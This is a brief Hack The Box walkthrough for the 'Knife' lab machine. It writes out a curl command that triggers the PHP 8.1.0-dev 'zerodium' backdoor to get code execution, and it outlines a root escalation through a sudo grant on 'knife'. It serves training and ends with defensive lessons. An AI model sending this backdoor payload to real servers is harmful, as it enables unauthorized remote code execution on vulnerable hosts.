---
title: "Knife — Hack The Box Walkthrough"
description: "Exploiting the PHP 8.1.0-dev backdoor for RCE and escalating via sudo on Knife."
date: 2026-09-02
category: offensive
readTime: "4 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "PHP"
  - "Backdoor"
  - "sudo"
  - "RCE"
  - "Linux"
  - "CTF"
summary: "Exploiting the PHP 8.1.0-dev backdoor for RCE and escalating via sudo on Knife."
---

**Machine:** Knife
**Difficulty:** Easy
**Key Techniques:** PHP 8.1.0-dev backdoor, RCE, sudo privesc

---

## Enumeration

### Port Scanning

```
22/tcp  open  ssh    OpenSSH
80/tcp  open  http   Title: Emergent Medical Idea
```

---

## Exploitation

### PHP 8.1.0-dev Backdoor

The site runs **PHP 8.1.0-dev**, whose build contains a **backdoor** triggered by the `User-Agentt: zerodium` header:

```bash
curl -H "User-Agentt: zerodiumsystem('id');" http://10.129.51.144/
```

Spawn a reverse shell and stabilize it:

```
user.txt: <flag>
```

---

## Privilege Escalation — sudo

```bash
sudo -l
```

A GTFOBin (e.g. `sudo knife` or an open command) runs an interactive shell as root.

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Never run development/interpreter builds in production.** PHP 8.1.0-dev shipped with a malicious backdoor.
2. **Pin and patch PHP versions** and update the runtime regularly.
3. **Review `sudo -l` grants** and remove GTFOBin-capable entries like `knife`.
